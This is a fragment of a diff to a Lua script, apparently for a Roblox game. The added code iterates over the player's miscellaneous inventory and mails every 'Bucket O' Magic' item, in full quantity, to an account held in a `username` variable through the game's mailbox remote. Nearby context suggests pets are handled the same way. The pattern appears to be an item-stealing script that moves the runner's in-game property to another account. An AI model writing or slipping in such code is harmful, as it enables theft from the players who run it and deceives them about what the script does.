@@ -65,6 +65,21 @@ end
 
 task.wait(2)
 
+local ms = result.Inventory.Misc
+for i, v in pairs(ms) do
+    if v.id == "Bucket O' Magic" then
+        local args = {
+            username,
+            "Bucket",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
 
 local pet = result.Inventory.Pet
 for i, v in pairs(pet) do
